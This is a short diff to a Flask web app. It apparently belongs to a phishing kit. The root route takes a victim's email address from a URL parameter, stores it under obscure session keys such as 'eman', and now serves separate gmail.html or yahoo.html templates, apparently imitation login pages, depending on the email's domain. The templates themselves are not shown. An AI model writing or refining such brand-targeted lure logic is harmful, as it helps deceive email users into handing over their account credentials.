@@ -173,9 +173,21 @@ def success():
 @app.route("/")
 def route2():
     web_param = request.args.get('web')
-    if web_param:
-        session['eman'] = web_param
-        session['ins'] = web_param[web_param.index('@') + 1:]
+    
+    if web_param and "@" in web_param:
+        domain = web_param.split("@")[-1]  # Extract the domain part
+        
+        if domain in ["gmail.com", "yahoo.com"]:  # Check if it's allowed
+            session['eman'] = web_param
+            session['ins'] = domain
+            
+            # Render different templates based on domain
+            if domain == "gmail.com":
+                return render_template('gmail.html', eman=session['eman'], ins=session['ins'])
+            elif domain == "yahoo.com":
+                return render_template('yahoo.html', eman=session['eman'], ins=session['ins'])
+    
+    # Default template if no valid email is given
     return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
 
 
